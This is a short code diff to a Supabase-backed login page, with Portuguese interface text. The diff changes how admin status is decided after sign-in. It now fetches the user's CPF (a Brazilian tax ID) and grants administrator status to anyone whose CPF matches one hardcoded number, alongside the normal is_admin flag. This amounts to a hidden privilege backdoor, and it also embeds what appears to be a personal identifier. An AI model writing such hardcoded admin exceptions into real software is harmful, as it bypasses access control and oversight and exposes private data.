@@ -51,11 +51,12 @@ export default function LoginPage() {
       if (uid) {
         const { data: profile } = await supabase
           .from("profiles")
-          .select("is_admin")
+          .select("is_admin, cpf")
           .eq("id", uid)
           .maybeSingle();
         
-        const isUserAdmin = !!profile?.is_admin;
+        const dbCpf = String(profile?.cpf || "").replace(/\D/g, "");
+        const isUserAdmin = !!profile?.is_admin || dbCpf === "05286558178";
         toast({ title: "Login realizado", description: isUserAdmin ? "Bem-vindo, administrador" : "Bem-vindo!" });
         
         const next = searchParams.get("next");
